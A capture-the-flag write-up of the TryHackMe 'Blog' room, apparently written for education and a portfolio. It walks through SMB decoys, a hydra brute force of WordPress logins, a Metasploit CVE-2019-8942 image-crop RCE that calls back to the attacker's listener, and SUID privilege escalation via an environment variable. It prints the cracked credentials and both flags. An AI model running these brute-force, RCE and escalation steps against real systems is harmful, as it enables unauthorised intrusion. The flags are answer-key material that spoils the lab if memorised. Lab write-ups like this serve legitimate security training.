# 🛡️ TryHackMe – Blog - Writeup

## 📌 Overview
**Room Name:** Blog  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** WordPress / CVE-2019-8942 / SUID / PrivEsc

WordPress 5.0 machine exploited through CVE-2019-8942 (authenticated image crop RCE). SMB share is a decoy; credentials are brute-forced with hydra, then root is obtained via a SUID binary that reads an environment variable.

Attack chain overview:

- Port scan → WordPress 5.0 on port 80, SMB on 139/445
- SMB `BillySMB` investigated and eliminated as rabbit hole (stego decoys)
- `wpscan` enumerates users `kwheel`, `bjoel`; hydra cracks `kwheel:cutiepie1`
- CVE-2019-8942 via Metasploit `wp_crop_rce` → shell as `www-data`
- `/home/bjoel/user.txt` is a decoy; real user flag at `/media/usb/user.txt`
- SUID `/usr/sbin/checker` → `strings` reveals `getenv("admin")` → root

---

## 🔍 1. Enumeration

### 🔎 Port Scan

```bash
rustscan -a <TARGET_IP> -r 1-65535 -- -sV -sC
```

```text
22/tcp  open  ssh          OpenSSH 7.6p1 Ubuntu
80/tcp  open  http         Apache 2.4.29 (WordPress 5.0)
139/tcp open  netbios-ssn  Samba 3.X - 4.X
445/tcp open  netbios-ssn  Samba 4.7.6-Ubuntu
```

Key nmap script output:

```text
http-title:      Billy Joel's IT Blog
http-generator:  WordPress 5.0
robots.txt:      /wp-admin/ disallowed

smb2-security-mode:
  message_signing: disabled
  account_used: guest
```

Two immediately actionable attack surfaces: a WordPress installation (known version, known vulnerabilities) and an open SMB share with guest access.

---

## 🔍 2. SMB Investigation (Rabbit Hole)

```bash
smbclient -L //<TARGET_IP>/ -N
```

```text
Sharename    Type    Comment
BillySMB     Disk    Billy's local SMB Share
print$       Disk    Printer Drivers
IPC$         IPC     IPC Service
```

```bash
smbclient //<TARGET_IP>/BillySMB -N
smb: \> get Alice-White-Rabbit.jpg
smb: \> get tswift.mp4
smb: \> get check-this.png
```

All three files were analysed for hidden content:

```bash
steghide info Alice-White-Rabbit.jpg
# → embedded file "rabbit_hole.txt" detected

stegseek -sf Alice-White-Rabbit.jpg -p ""
# → passphrase empty; extracted rabbit_hole.txt

cat Alice-White-Rabbit.jpg.out
# → "You've found yourself in a rabbit hole, friend."

binwalk check-this.png
# → PNG + Zlib only (no embedded data)
```

`check-this.png` turned out to be a QR code. Decoding it returned a YouTube link for an unrelated video.

The embedded message in `Alice-White-Rabbit.jpg` was the room explicitly calling out the dead end. All three files were decoys — the SMB share was a rabbit hole by design. Eliminated and moved to WordPress.

---

## 🔍 3. WordPress Enumeration

```bash
wpscan --url http://blog.thm --enumerate u --no-update
```

```text
[+] WordPress version 5.0 identified (Insecure)
[+] XML-RPC enabled: http://blog.thm/xmlrpc.php
[+] Upload directory listing enabled: http://blog.thm/wp-content/uploads/

[i] User(s) identified:
  kwheel  (Karen Wheeler)
  bjoel   (Billy Joel)
```

WordPress 5.0 is affected by CVE-2019-8942, an authenticated RCE through the image crop feature — but valid credentials are required first.

---

## 🔑 4. Password Cracking

### wpscan xmlrpc-multicall (abandoned)

```bash
wpscan --url http://blog.thm \
  -U kwheel,bjoel \
  -P /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc-multicall \
  --no-update -t 50
```

After 20+ minutes at 2% progress, this approach was abandoned. The `xmlrpc-multicall` method batches multiple login attempts per request, but it was clearly too slow for this environment.

### hydra http-post-form (success)

```bash
hydra -l kwheel \
  -P /usr/share/wordlists/rockyou.txt \
  blog.thm http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:incorrect" \
  -t 30 -v
```

```text
[80][http-post-form] host: blog.thm   login: kwheel   password: cutiepie1
```

Credentials recovered: **`kwheel:cutiepie1`**

> **Why switch to hydra:** `wpscan --password-attack xmlrpc-multicall` batches requests efficiently in theory, but performance in practice depends heavily on server-side rate limiting and XML-RPC response time. When progress stalls at single-digit percentages after many minutes, switching to direct POST form brute-force with `hydra` is the pragmatic choice — it hits the same endpoint the browser uses and is easier to tune with `-t`.

---

## 💥 5. Initial Access — CVE-2019-8942 (wp_crop_rce)

WordPress 5.0 is vulnerable to an authenticated remote code execution bug in the image crop feature (CVE-2019-8942). A crafted PHP payload is injected into an image's EXIF metadata via `exiftool`, uploaded as a post thumbnail, and then triggered by manipulating the crop coordinates to cause the file to be included as PHP.

### Metasploit `uninitialized constant HTTP` error

```bash
msf > use exploit/multi/http/wp_crop_rce
# → [-] The supplied module name is ambiguous: uninitialized constant HTTP.
```

This error occurs when Metasploit's module cache is stale or incomplete — the module exists on disk but hasn't been indexed correctly. `use 0` after searching produced the same error.

The fix, found in a Metasploit GitHub issue, is to force a full module reload:

```bash
msf > reload_all
# → [*] Reloading modules from all module paths... (takes several minutes)
```

After `reload_all` completed, the module loaded cleanly:

```bash
msf > use exploit/multi/http/wp_crop_rce
msf exploit(wp_crop_rce) > set RHOSTS blog.thm
msf exploit(wp_crop_rce) > set USERNAME kwheel
msf exploit(wp_crop_rce) > set PASSWORD cutiepie1
msf exploit(wp_crop_rce) > set LHOST <LOCAL_IP>
msf exploit(wp_crop_rce) > set LPORT 4444
msf exploit(wp_crop_rce) > run
```

```text
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (45739 bytes) to <TARGET_IP>
[+] Meterpreter session 1 opened
```

```bash
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
whoami
# → www-data
```

**Initial access as `www-data` achieved.** ✅

---

## 🔍 6. Locating user.txt (Decoy Awareness)

```bash
find / -name "user.txt" 2>/dev/null
```

```text
/home/bjoel/user.txt
/media/usb/user.txt
```

```bash
cat /home/bjoel/user.txt
# → "You won't find what you're looking for here. TRY HARDER"

cat /media/usb/user.txt
# → c8421899aae571f7af486492b71a8ab7
```

The flag in `/home/bjoel/` is an intentional decoy. The real user flag is mounted on a USB device at `/media/usb/`.

**User flag captured.** ✅

---

## 👑 7. Privilege Escalation: www-data → root

### SUID Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/sbin/checker    ← non-standard binary
/usr/bin/passwd
/usr/bin/newgrp
...
```

`/usr/sbin/checker` is not a standard system binary. Its presence with the SUID bit set makes it an immediate escalation candidate.

### Binary Analysis with `strings`

```bash
file /usr/sbin/checker
# → setuid, setgid ELF 64-bit LSB shared object

strings /usr/sbin/checker
```

```text
getenv
admin
setuid
system
/bin/bash
Not an Admin
checker.c
```

The output reveals the binary's internal logic without needing to decompile it:

1. `getenv("admin")` — reads the `admin` environment variable
2. If the value is set (non-null), it calls `setuid` followed by `system("/bin/bash")`
3. Otherwise it prints `Not an Admin` and exits

Since the binary runs with SUID (as root), and it spawns `/bin/bash` after calling `setuid(0)`, setting the `admin` variable before execution is sufficient to get a root shell.

### Exploitation

```bash
export admin=1
/usr/sbin/checker
whoami
# → root
```

**ROOT ACCESS GRANTED.** ✅

```bash
cat /root/root.txt
# → 9a0b2b618bef9bfa7ac28c1353d9f318
```

---

## 🏁 Flags

### 🧍 User Flag

```
c8421899aae571f7af486492b71a8ab7
```

### 👑 Root Flag

```
9a0b2b618bef9bfa7ac28c1353d9f318
```

---

## 📚 Key Takeaways

- 🐇 **Read the rabbit hole's message before spending more time on it:** `Alice-White-Rabbit.jpg` literally contained a file named `rabbit_hole.txt` saying "You've found yourself in a rabbit hole." The room signalled the dead end explicitly. In a real engagement the signal wouldn't be this obvious, but in CTFs, if a path yields only humour and no credentials, cut it early.

- ⚡ **Switch brute-force method when progress stalls:** `wpscan --password-attack xmlrpc-multicall` is efficient in theory but can crawl against rate-limited targets. After 20 minutes at 2%, switching to `hydra` with a direct POST form attack finished the job quickly. Know your alternative and don't wait indefinitely for a slow tool.

- 🔧 **Metasploit `uninitialized constant HTTP` → `reload_all`:** This cryptic error means the module index is stale, not that the module is missing. Running `reload_all` forces a full re-index of all modules and resolves it. This is a known issue in certain Metasploit installations and is not well-documented in official sources — `reload_all` is the fix.

- 🔎 **`strings` on an unknown SUID binary reveals its logic:** Without source code or a decompiler, `strings /usr/sbin/checker` exposed the function calls (`getenv`, `setuid`, `system`), the variable name (`admin`), the command it executes (`/bin/bash`), and even the source file name (`checker.c`). When faced with a custom SUID binary, `strings` is the fastest first step — it often tells you exactly what the binary expects.

- 📂 **User flags are not always in `/home/`:** The flag in `/home/bjoel/user.txt` was an intentional decoy. Always run `find / -name "user.txt" 2>/dev/null` to locate every instance before assuming the first result is correct. Mounted paths like `/media/` are common alternate locations in CTF machines.

---

## 🛠️ Tools Used

- `rustscan`
- `smbclient`
- `steghide`, `stegseek`, `binwalk`
- `wpscan`
- `hydra`
- `metasploit` (`wp_crop_rce`)
- `python3` (PTY stabilization)
- `find` (SUID search)
- `strings`, `file`

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
